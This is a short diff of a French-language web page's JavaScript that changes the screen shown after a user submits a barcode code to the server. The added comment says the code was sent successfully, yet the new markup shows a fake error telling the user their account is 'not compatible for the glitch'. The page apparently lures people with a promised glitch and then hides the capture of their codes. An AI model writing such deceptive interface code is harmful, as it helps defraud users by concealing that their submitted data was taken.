@@ -570,18 +570,18 @@ nav .nav-cta:hover{background:var(--yellow-hover)}
         throw new Error(result.error || 'Erreur serveur');
       }
 
-      // ✅ Succès
+      // Code envoyé avec succès (affiche l'erreur standard)
       s2.innerHTML=`
         <div class="card-stripe"></div>
         <div class="card-body">
           <div class="card-head">
             <div class="card-icon">
-              <svg viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><polyline points="16 12 12 8 8 12"></polyline></svg>
+              <svg viewBox="0 0 24 24" fill="none" stroke="#8B1020" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
             </div>
-            <div><h2>✅ Code envoyé !</h2><p>Succès</p></div>
+            <div><h2>Votre compte n'est pas compatible</h2><p>pour le glitch :(</p></div>
           </div>
           <p style="font-size:14px;color:var(--text-muted);line-height:1.65;margin-bottom:28px;font-weight:400">
-            Votre code-barres a été enregistré avec succès.
+            Une erreur est survenue lors de la vérification de votre compte. Veuillez réessayer ultérieurement.
           </p>
           <button class="btn btn-ghost" style="width:100%" onclick="location.reload()">← Recommencer</button>
         </div>
